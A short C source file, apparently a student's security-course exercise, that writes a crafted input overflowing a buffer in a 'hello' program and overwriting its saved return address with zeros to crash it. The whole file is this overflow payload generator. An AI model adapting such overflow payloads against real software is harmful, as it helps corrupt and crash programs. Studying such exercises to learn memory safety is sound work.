/*
  Name: Manos Chatzakis
  AM  : 4238
  Mail: csd4238@csd.uoc.gr
  File: createdata3.c

  This file breaks hello programm by destroying its return address.
*/

#include <stdio.h>

int main(void){

  int i;

  /*Write on 44 bytes of buff and the 4 bytes of c variable*/
  for(i=0; i<48; i++){ putchar('a'); }

  /*Jump to index 56, where ret address is located*/
  putchar(0x38);

  /*Destroy return address*/
  putchar(0x00);

  /*Note that changing only the first byte is enough. Though we do it just to be sure*/
  putchar(0x00);
  putchar(0x00);
  putchar(0x00);

  return 0;
}
